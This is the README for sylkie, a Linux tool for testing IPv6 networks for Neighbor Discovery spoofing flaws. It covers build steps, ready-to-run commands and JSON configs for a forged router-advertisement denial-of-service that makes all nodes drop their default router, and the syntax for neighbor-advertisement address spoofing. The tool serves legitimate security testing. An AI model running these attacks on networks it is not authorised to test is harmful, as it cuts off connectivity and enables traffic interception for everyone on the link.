# `sylkie` 

[![Travis Build Status](https://img.shields.io/travis/dlrobertson/sylkie/master.svg?label=master%20build)](https://travis-ci.org/dlrobertson/sylkie)

A command line tool and library for testing networks for common address
spoofing security vulnerabilities in IPv6 networks using the Neighbor
Discovery Protocol.

## Getting Started

**Note:** This project is still in the early phases of development. If you run into any problems,
please consider submitting an [issue](https://github.com/dlrobertson/sylkie/issues). It currently
only runs on Linux.

### Dependencies

 - [libseccomp](https://github.com/seccomp/libseccomp) (Optional, but highly recommended)
 - [json-c](https://github.com/json-c/json-c) (Optional, but recommended)

See [The Wiki](https://github.com/dlrobertson/sylkie/wiki#building) for more details.

### Build

Get the code and compile it!

```
# Get the code
git clone https://github.com/dlrobertson/sylkie
cd ./sylkie

# Compile the code
mkdir -p ./build
cd ./build
cmake -DCMAKE_BUILD_TYPE=Release ..
make
make install
```

## Basic usage

The following describes the basic usage of `sylkie`. Run `sylkie -h` or
`sylkie <subcommand> -h` for more details.

### DoS (Router Advert)

The basic usage of the `sylkie` router advert command is listed below.
This command will send a Router Advertisement message to the given ip
or the all nodes multicast addres causing the targeted nodes to remove
`<router-ip>/<prefix>` from their list of default routes.

```
sylkie ra -i <interface> \
    --target-mac <mac of router> \
    --router-ip <ip of router> \
    --prefix <router prefix> \
    --timeout <time between adverts> \
    --repeat <number of times to send the request>
```

#### Router Advert Examples

A basic example.

```
sylkie ra -i ens3 \
    --target-mac 52:54:00:e3:f4:06 \
    --router-ip fe80::b95b:ee1:cafe:9720 \
    --prefix 64 \
    --repeat -1 \
    --timeout 10
```

This would send a "forged" Router Advertisement to the link local scope
all-nodes address `ff02::1` causing all of the nodes to remove
`fe80::b95b:ee1:cafe:9720/64` (link-layer address `52:54:00:e3:f4:06`)
from their list of default routes.

That is quite a bit of info. To make life easier `sylkie` also accepts
json, where the subcommand (`ra`, `na`) is a key whos value is an array
of objects with the keys and values being the corresponding option
and value. To run the command, pass the path to the json file as the
argument to the `-j` option.

To run the above command from json, first create a file with the following.

```
{
    "ra": [
        {
            "interface": "ens3",
            "target-mac": "52:54:00:e3:f4:06",
            "router-ip": "fe80::b95b:ee1:cafe:9720",
            "prefix": 64,
            "repeat": -1,
            "timeout": 10
        }
    ]
}
```

After creating the file, start sending adverts with the following.

```
sylkie -j /path/to/json
```

This becomes especially useful if there is a set of advertisements
that need to be configured and sent. For example, the following json
config would send two router advertisements on the configured
intervals.

```
{
    "ra": [
        {
            "interface": "ens3",
            "target-mac": "52:54:00:e3:f4:06",
            "router-ip": "fe80::b95b:ee1:cafe:9720",
            "prefix": 64,
            "repeat": -1,
            "timeout": 10
        },
        {
            "interface": "ens3",
            "target-mac": "52:54:00:c2:a7:7c",
            "router-ip": "fe80::cbed:6822:cd23:bbdb",
            "prefix": 64,
            "repeat": -1,
            "timeout": 10
        }
    ]
}
```

#### How it works

The router advert (`ra`) command attempts to DoS a network by sending
"forged" Router Advertisement messages to either a targeted address
(if one is provided) or the link local scope all-nodes address `ff02::1`.
The "forged" Router Advertisement contains [Prefix Information](https://tools.ietf.org/html/rfc4861#section-4.6.2)
with the lifetimes set to 0. The message also contains the
[Source Link-Layer Address](https://tools.ietf.org/html/rfc4861#section-4.6.1).
This should cause the targeted address or all link local nodes to
remove the targetted router from the list of default routes.

### Address spoofing (Neighbor Advert)

```
sylkie na -i <interface> \
    --dst-mac <dest hw addr> \
    --src-ip <source ip> \
    --dst-ip <dest ip address> \
    --target-ip <target ip address> \
    --target-mac <target mac address> \
    --timeout <time betweeen adverts> \
    --repeat <number of times to send the request>
```
